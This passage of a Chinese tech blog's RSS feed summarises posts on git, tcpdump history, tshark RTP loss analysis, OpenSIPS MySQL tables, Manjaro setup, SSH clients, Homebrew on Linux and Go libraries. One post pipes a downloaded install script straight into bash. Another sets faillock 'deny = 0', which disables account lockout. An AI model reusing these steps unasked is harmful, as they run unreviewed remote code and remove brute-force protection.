&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是这时候git repo的仓库地址是 &lt;a href=&#34;https://gitclone.com/github.com/wangduanduan/opensips.git&#34;&gt;https://gitclone.com/github.com/wangduanduan/opensips.git&lt;/a&gt;，并不是真正的仓库地址，而且我更喜欢用的是ssh方式的远程地址，所以我们就需要修改一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git remote set-url origin git@github.com:wangduanduan/opensips.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>[未完成] 浪潮之底系列 - tcpdump的故事</title>
      <link>https://wdd.js.org/posts/2022/03/tcpdump/</link>
      <pubDate>Sun, 27 Mar 2022 17:33:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/03/tcpdump/</guid>
      <description>&lt;p&gt;故事发生在1988年的美国。这一年互联网的始祖网络，阿帕网已经诞生了将近20年。而我们所熟知的linux将在三年后，也就是1991才出现。&lt;/p&gt;
&lt;p&gt;在1988年，这时候的互联网只有阿帕网。 然而这个网络并没有想象中的那么好用，他还存在很多问题，而且也经常崩溃。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/03/tcpdump/2022-10-29-20-30-11.png&#34;&gt;
解决阿帕网崩溃的这个问题，落到了LBL（Lawrence Berkeley National Laboratory&lt;!-- raw HTML omitted --&gt;实验室的肩上。&lt;/p&gt;
&lt;p&gt;这个实验室有四个牛人，他们同时也是tcpdump的发明人。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Van Jacobson&lt;/li&gt;
&lt;li&gt;Sally Floyd&lt;/li&gt;
&lt;li&gt;Vern Paxson&lt;/li&gt;
&lt;li&gt;Steve McCanne&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个实验室主要的研究方向是TCP拥塞控制、BSD包过滤、VoIP等方向。&lt;/p&gt;
&lt;p&gt;为了解决阿帕网经常崩溃的问题，就必须要有一个好用的抓包工具。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/03/tcpdump/2022-10-29-20-30-26.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;本着不重复造轮子的原则，这时候也已经又了一个叫做etherfind的工具，但是这个工具有以下的问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包过滤的语法非常蹩脚&lt;/li&gt;
&lt;li&gt;协议编解码能力非常弱&lt;/li&gt;
&lt;li&gt;性能也非常弱&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总之一句话，他们认为etherfind不行。&lt;/p&gt;
&lt;p&gt;工欲善其事，必先利其器。所以他们就想创造一个新的工具。这个工具必须要有以下的特征&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;能够从协议栈底层过滤包&lt;/li&gt;
&lt;li&gt;把高级的过滤语法能够编译的底层的代码&lt;/li&gt;
&lt;li&gt;能够在驱动层进行过滤&lt;/li&gt;
&lt;li&gt;创建了一个内核模块叫做 Berkeley Packet Filter(BPF)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/03/tcpdump/2022-10-29-20-30-39.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/ARPAnet/3562284&#34;&gt;https://baike.baidu.com/item/ARPAnet/3562284&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>tshark 快速分析语音流问题</title>
      <link>https://wdd.js.org/opensips/tools/tshark/</link>
      <pubDate>Tue, 08 Mar 2022 11:02:18 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/tshark/</guid>
      <description>&lt;p&gt;wireshark安装之后，tshark也会自动安装。tshark也可以单独安装。&lt;/p&gt;
&lt;p&gt;如果我们想快速的分析语音刘相关的问题，可以参考下面的一个命令。&lt;/p&gt;
&lt;p&gt;语音卡顿，常见的原因就是网络丢包，tshark在命令行中快速输出语音流的丢包率。&lt;/p&gt;
&lt;p&gt;如下所示，rtp的丢包率分别是2.5%和4.6%。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tshark -r abc.pcap -q -z rtp,streams
========================= RTP Streams ========================
   Start time      End time     Src IP addr  Port    Dest IP addr  Port       SSRC          Payload  Pkts         Lost   Min Delta(ms)  Mean Delta(ms)   Max Delta(ms)  Min Jitter(ms) Mean Jitter(ms)  Max Jitter(ms) Problems?
     2.666034     60.446026    192.168.69.12 18892   192.168.68.111 26772 0x76EFFF66            g711A  2807    72 (2.5%)           0.011          20.592         120.002           0.001           0.074           2.430 X
     0.548952     60.467686   192.168.68.111 26772    192.168.69.12 18892 0xA655E7B6            g711A  2215   106 (4.6%)           9.520          21.202         219.777           0.055           6.781         256.014 X
==============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;tshark的-z参数&#34;&gt;tshark的-z参数&lt;/h1&gt;
&lt;p&gt;-z参数可以用来提取各种统计数据。&lt;/p&gt;</description>
    </item>
    <item>
      <title>为什么我又开始使用Firefox浏览器</title>
      <link>https://wdd.js.org/posts/2020/02/yva0h1/</link>
      <pubDate>Fri, 25 Feb 2022 23:03:41 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/02/yva0h1/</guid>
      <description>&lt;p&gt;对于浏览器，我有以下几个需求&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能在所有平台上运行，包括mac, windows, linux, ios, 安卓&lt;/li&gt;
&lt;li&gt;能够非常方便的同步浏览器之间的数据，例如书签之类的&lt;/li&gt;
&lt;li&gt;能够很方便的安装扩展程序，无需翻墙&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;按照这些条件，只有Firefox能否满足。&lt;/p&gt;
&lt;p&gt;当然安装使用Firefox的时候，也出现了几小插曲。&lt;/p&gt;
&lt;h1 id=&#34;macos&#34;&gt;macos&lt;/h1&gt;
&lt;p&gt;我在ios上登录Firefox上的账户，在MacOS的Firefox却无法登陆，查了才发现，原来FireFox的账号分为国内版和国际版，两者之间数据不通，所以在macos上，也要登陆国内版本，就是带有火狐通行证的登陆页面。&lt;/p&gt;
&lt;p&gt;需要在同步页面点击切换至本地服务。&lt;/p&gt;
&lt;h1 id=&#34;linuxmanjaro&#34;&gt;linux/manjaro&lt;/h1&gt;
&lt;p&gt;manjaro上安装的firefox居然没有切换本地服务这个选项，后来发现这个浏览器上没有附加组件管理器&lt;!-- raw HTML omitted --&gt;所以需要去 &lt;a href=&#34;http://mozilla.com.cn/moz-addon.html&#34;&gt;http://mozilla.com.cn/moz-addon.html&lt;/a&gt;， 安装好附加组件管理器，登陆的时候，应该就可以跳转到带有火狐通行证的登陆页面了。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>有意思的命令行工具</title>
      <link>https://wdd.js.org/posts/2022/02/</link>
      <pubDate>Fri, 25 Feb 2022 09:23:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/02/</guid>
      <description>&lt;h1 id=&#34;1-datamash&#34;&gt;1. datamash&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gnu.org/software/datamash/&#34;&gt;https://www.gnu.org/software/datamash/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;能够方便的计算数据的平均值，最大值，最小值等数据。&lt;/p&gt;
&lt;h1 id=&#34;2-textsql&#34;&gt;2. textsql&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dinedal/textql&#34;&gt;https://github.com/dinedal/textql&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;能够方便的对csv文件做sql查询&lt;/p&gt;
&lt;h1 id=&#34;3-graph-cli&#34;&gt;3. graph-cli&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mcastorina/graph-cli&#34;&gt;https://github.com/mcastorina/graph-cli&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;能够直接读取csv文件，然后绘图。&lt;/p&gt;</description>
    </item>
    <item>
      <title>mysql建表语句</title>
      <link>https://wdd.js.org/opensips/ch5/sql-table/</link>
      <pubDate>Thu, 24 Feb 2022 10:47:23 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/sql-table/</guid>
      <description>&lt;p&gt;OpenSIPS需要用数据库持久化数据，常用的是mysql。&lt;/p&gt;
&lt;p&gt;可以参考这个官方的教程去初始化数据库的数据 &lt;a href=&#34;https://www.opensips.org/Documentation/Install-DBDeployment-2-4&#34;&gt;https://www.opensips.org/Documentation/Install-DBDeployment-2-4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你想自己创建语句，也是可以的，实际上建表语句在OpenSIPS安装之后，已经被保存在你的电脑上。&lt;/p&gt;
&lt;p&gt;一般位于  /usr/local/share/opensips/mysql 目录中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /usr/local/share/opensips/mysql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;acc-create.sql          call_center-create.sql   dispatcher-create.sql            group-create.sql          rls-create.sql        uri_db-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alias_db-create.sql     carrierroute-create.sql  domain-create.sql                imc-create.sql            rtpengine-create.sql  userblacklist-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth_db-create.sql      closeddial-create.sql    domainpolicy-create.sql          load_balancer-create.sql  rtpproxy-create.sql   usrloc-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;avpops-create.sql       clusterer-create.sql     drouting-create.sql              msilo-create.sql          siptrace-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b2b-create.sql          cpl-create.sql           emergency-create.sql             permissions-create.sql    speeddial-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b2b_sca-create.sql      dialog-create.sql        fraud_detection-create.sql       presence-create.sql       standard-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cachedb_sql-create.sql  dialplan-create.sql      freeswitch_scripting-create.sql  registrant-create.sql     tls_mgm-create.sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>manjaro kde 之旅</title>
      <link>https://wdd.js.org/posts/2022/01/</link>
      <pubDate>Tue, 18 Jan 2022 09:39:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/01/</guid>
      <description>&lt;h1 id=&#34;1-安装vivaldi浏览器&#34;&gt;1. 安装vivaldi浏览器&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pamac install vivaldi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考：&lt;a href=&#34;https://wiki.manjaro.org/index.php/Vivaldi_Browser&#34;&gt;https://wiki.manjaro.org/index.php/Vivaldi_Browser&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-关闭三次密码错误锁定&#34;&gt;2. 关闭三次密码错误锁定&lt;/h1&gt;
&lt;p&gt;修改/etc/security/faillock.conf， 将其中的deny取消注释，并改为0，然后注销。重新登录。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;deny = 0
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-禁用大写锁定键&#34;&gt;3. 禁用大写锁定键&lt;/h1&gt;
&lt;p&gt;在输入设备中，选择键盘-》高级》 Caps Lock行为， 选中Caps Lock被禁用， 然后应用。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/01/2022-10-29-20-06-37.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>RTP 不连续的timestamp和SSRC</title>
      <link>https://wdd.js.org/opensips/ch4/rtp-timestamp/</link>
      <pubDate>Mon, 10 Jan 2022 22:05:10 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch4/rtp-timestamp/</guid>
      <description>&lt;p&gt;最近遇到一些和媒体流相关的问题，使用wireshark分析之后，总算有些眉目。然而我深感对RTP协议的理解，还是趋于表面。所以我决定，深入的学习一下RTP协议。&lt;/p&gt;
&lt;p&gt;和rtp相关的协议有两个rfc, 分别是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1996的的 RFC 1889&lt;/li&gt;
&lt;li&gt;2003年的 RFC 3550&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;RFC 3550是对RFC 1889的稍微改进，然而大体上是没什么改变的。所以我们可以直接看RFC 3550。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RTP 底层用的是UDP协议&lt;/li&gt;
&lt;li&gt;RTP 的使用场景是传输实时数据，例如语音，视频，模拟数据等等&lt;/li&gt;
&lt;li&gt;RTP 并不保证QoS&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Synchronization source (SSRC):&lt;/strong&gt; The source of a stream of RTP packets, identified by a 32-bit numeric SSRC identifier carried in the RTP header so as not to be dependent upon the network address. All packets from a synchronization source form part of the same timing and sequence number space, so a receiver groups packets by synchronization source for playback. Examples of synchronization sources include the sender of a stream of packets derived from a signal source such as a microphone or a camera, or an RTP mixer (see below). A synchronization source may change its data format, e.g., audio encoding, over time. The SSRC identifier is a randomly chosen value meant to be globally unique within a particular RTP session (see Section 8). A participant need not use the same SSRC identifier for all the RTP sessions in a multimedia session; the binding of the SSRC identifiers is provided through RTCP (see Section 6.5.1). If a participant generates multiple streams in one RTP session, for example from separate video cameras, each MUST be identified as a different SSRC.&lt;/p&gt;</description>
    </item>
    <item>
      <title>开源免费的ssh终端工具</title>
      <link>https://wdd.js.org/posts/2021/12/</link>
      <pubDate>Wed, 22 Dec 2021 16:53:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/12/</guid>
      <description>&lt;h1 id=&#34;要求&#34;&gt;要求&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;[必须] 能够保存密码, 或者用私钥登录&lt;/li&gt;
&lt;li&gt;[必须] 能够支持ftp/sftp&lt;/li&gt;
&lt;li&gt;[必须] 开源免费&lt;/li&gt;
&lt;li&gt;[必须] 界面漂亮，支持中文字符&lt;/li&gt;
&lt;li&gt;[可选] 支持同步ssh配置&lt;/li&gt;
&lt;li&gt;[必须] 支持跨平台&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;tabby&#34;&gt;Tabby&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A terminal for a more modern age (formerly Terminus)
&lt;a href=&#34;https://github.com/Eugeny/tabby&#34;&gt;https://github.com/Eugeny/tabby&lt;/a&gt;
&lt;a href=&#34;https://tabby.sh/&#34;&gt;https://tabby.sh/&lt;/a&gt;
25.7k Star
基于electron, 主要开发语言typescript&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;electerm&#34;&gt;Electerm&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Terminal/ssh/sftp client(linux, mac, win)
&lt;a href=&#34;https://github.com/electerm/electerm&#34;&gt;https://github.com/electerm/electerm&lt;/a&gt;
&lt;a href=&#34;https://electerm.github.io/electerm/&#34;&gt;https://electerm.github.io/electerm/&lt;/a&gt;
4.8k star
基于electron, 主要开发语言javascript&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;windterm&#34;&gt;WindTerm&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A Quicker and better SSH/Telnet/Serial/Shell/Sftp client for DevOps.&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/kingToolbox/WindTerm&#34;&gt;https://github.com/kingToolbox/WindTerm&lt;/a&gt;
2.6K star
主要开发语言: C&lt;/p&gt;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>使用brew作为deepin的包管理工具</title>
      <link>https://wdd.js.org/posts/2021/11/</link>
      <pubDate>Thu, 18 Nov 2021 08:42:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/11/</guid>
      <description>&lt;p&gt;11月2号，我的主力开发工具macbook开始退役。&lt;/p&gt;
&lt;p&gt;我换了nuc11 i7,  安装了国产的deepin(深度)操作系统。总体体验蛮好的，只是apt-get的软件包里，太多都是很老的包。所以我想到以前用mac的包管理工具homebrew, 据说它不仅仅可以在mac上工作，主流的linux也是能够使用的。&lt;/p&gt;
&lt;p&gt;homebrew的介绍是：The Missing Package Manager for macOS (or Linux)。也就是说brew完全可以在linux上运行。&lt;/p&gt;
&lt;p&gt;安装方式也很简单：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的shell执行之后，brew就安装成功了。&lt;/p&gt;
&lt;p&gt;和mac不同的是，linux homebrew的安装包的可执行命令的目录是：/home/linuxbrew/.linuxbrew/bin, 所以需要把它加入到PATH中，安装的软件才能正确执行。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://brew.sh/&#34;&gt;https://brew.sh/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>我常用的第三方库</title>
      <link>https://wdd.js.org/golang/my-start-repo/</link>
      <pubDate>Fri, 08 Oct 2021 21:32:13 +0800</pubDate>
      <guid>https://wdd.js.org/golang/my-start-repo/</guid>
      <description>&lt;h1 id=&#34;web框架&#34;&gt;web框架&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/gofiber/fiber&#34;&gt;https://github.com/gofiber/fiber&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;http-client&#34;&gt;http client&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/go-resty/resty&#34;&gt;https://github.com/go-resty/resty&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;mock&#34;&gt;mock&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/jarcoal/httpmock&#34;&gt;https://github.com/jarcoal/httpmock&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;项目结构&#34;&gt;项目结构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/golang-standards/project-layout&#34;&gt;https://github.com/golang-standards/project-layout&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;环境变量操作&#34;&gt;环境变量操作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/caarlos0/env&#34;&gt;https://github.com/caarlos0/env&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/kelseyhightower/envconfig&#34;&gt;https://github.com/kelseyhightower/envconfig&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;测试框架&#34;&gt;测试框架&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/stretchr/testify&#34;&gt;https://github.com/stretchr/testify&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;日志框架&#34;&gt;日志框架&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/uber-go/zap&#34;&gt;https://github.com/uber-go/zap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;html解析&#34;&gt;html解析&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/PuerkitoBio/goquery&#34;&gt;https://github.com/PuerkitoBio/goquery&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;cli工具&#34;&gt;cli工具&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/urfave/cli&#34;&gt;https://github.com/urfave/cli&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;各种库大全集&#34;&gt;各种库大全集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/avelino/awesome-go&#34;&gt;https://github.com/avelino/awesome-go&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;终端颜色&#34;&gt;终端颜色&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/fatih/color&#34;&gt;https://github.com/fatih/color&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;剪贴板&#34;&gt;剪贴板&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/atotto/clipboard&#34;&gt;https://github.com/atotto/clipboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;数据库驱动&#34;&gt;数据库驱动&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/go-sql-driver/mysql&#34;&gt;https://github.com/go-sql-driver/mysql&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;热重载&#34;&gt;热重载&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/cosmtrek/air&#34;&gt;https://github.com/cosmtrek/air&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;时间处理&#34;&gt;时间处理&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/golang-module/carbon&#34;&gt;https://github.com/golang-module/carbon&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;错误封装&#34;&gt;错误封装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/pkg/errors&#34;&gt;https://github.com/pkg/errors&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;结构体转二进制&#34;&gt;结构体转二进制&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/lunixbochs/struc&#34;&gt;https://github.com/lunixbochs/struc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;vim智能补全提示&#34;&gt;VIM智能补全提示&lt;/h1&gt;
&lt;p&gt;需要安装coc-go, 还有vim-go&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/images/coc-go-tips.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>mysql placeholder的错误使用方式</title>
      <link>https://wdd.js.org/golang/mysql-placeholder/</link>
      <pubDate>Sun, 03 Oct 2021 21:52:40 +0800</pubDate>
      <guid>https://wdd.js.org/golang/mysql-placeholder/</guid>
      <description>&lt;div class=&#34;notice error&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-times-circle&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Error
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;lsquo;? (&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;然而我仔细看了看sql语句，没有看出来究竟哪里有sql报错。&lt;/p&gt;
&lt;p&gt;然而当我把作为placeholder的问号去掉，直接用表的名字，sql是可以直接执行的。我意识到这个可能是和placeholder有关。&lt;/p&gt;
&lt;p&gt;搜索了一下，看到一个链接 &lt;a href=&#34;https://github.com/go-sql-driver/mysql/issues/848&#34;&gt;https://github.com/go-sql-driver/mysql/issues/848&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Placeholder can&amp;rsquo;t be used for table name or column name. It&amp;rsquo;s MySQL spec. Not bug of this project.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;大意是说，placeholder是不能作为表名或者列名的。&lt;/p&gt;
&lt;p&gt;在mysql关于prepared文档介绍中，在允许使用prepared的语句里，没有看到create table可以用placeholder
&lt;a href=&#34;https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&#34;&gt;https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;prepared语句的优点有以下几个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优化查询速度&lt;/li&gt;
&lt;li&gt;防止sql注入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是也有一些限制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不是所有语句都能用prepared语句。常见的用法应该是作为select where之后的条件，或者INSERT语句之后的值&lt;/li&gt;
&lt;li&gt;不支持一个sql中多条查询语句的形式&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>印象笔记不太智能的智能替换</title>
      <link>https://wdd.js.org/posts/2021/10/</link>
      <pubDate>Sat, 02 Oct 2021 12:25:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/10/</guid>
      <description>&lt;h1 id=&#34;为什么是印象笔记&#34;&gt;为什么是印象笔记&lt;/h1&gt;
&lt;p&gt;作为一个笔记，或者说文本编辑器，一个最基本的要求，就是能按照用户的按键输入。而不是用户输入了A，然后在页面上看到了B。&lt;/p&gt;
&lt;p&gt;但是对于印象笔记来说，我已经遇到过好多次因为输入问题，几乎想要放弃印象笔记。但是就目前来讲，仍然没有好用的替代品。&lt;/p&gt;
&lt;p&gt;对于笔记软件来说，我有以下的几个最为基础的要求。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;必须跨平台。能够有桌面端App和IOS或者安卓的APP&lt;/li&gt;
&lt;li&gt;必须同步要快。&lt;/li&gt;
&lt;li&gt;必须要能有网页剪藏的插件&lt;/li&gt;
&lt;li&gt;必须要少折腾，用户体验好。我的目的是记录内容，而不是折腾各种同步或者网络配置。&lt;/li&gt;
&lt;li&gt;必须是付费的产品。免费的产品，是没有可持续发展潜力的。当然，付费需要在接受范围之内。&lt;/li&gt;
&lt;li&gt;必须足够稳定&lt;/li&gt;
&lt;li&gt;用户界面，体验必须足够好&lt;/li&gt;
&lt;li&gt;必须要离线使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;就目前来说，能满足以上几个要求的，屈指可数。&lt;/p&gt;
&lt;p&gt;印象笔记虽然有恶心的广告推送(即使会员也有广告)，但是一般在非特殊的日子，广告不回一直存在的。&lt;/p&gt;
&lt;h1 id=&#34;印象笔记不太智能的替换&#34;&gt;印象笔记不太智能的替换&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;把英文单引号替换成中文单引号&lt;/li&gt;
&lt;li&gt;把两个&amp;ndash;天换成一个中文破折号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上两个问题，在粘贴代码的时候，是致命的问题。我本来粘贴的是两个&amp;ndash;，粘贴到印象笔记里居然变成一个中文破折号，那么后期在复制出来用的，必然出现问题。&lt;/p&gt;
&lt;p&gt;我问了官方的客服，官方的客户也不知道怎么解决。&lt;/p&gt;
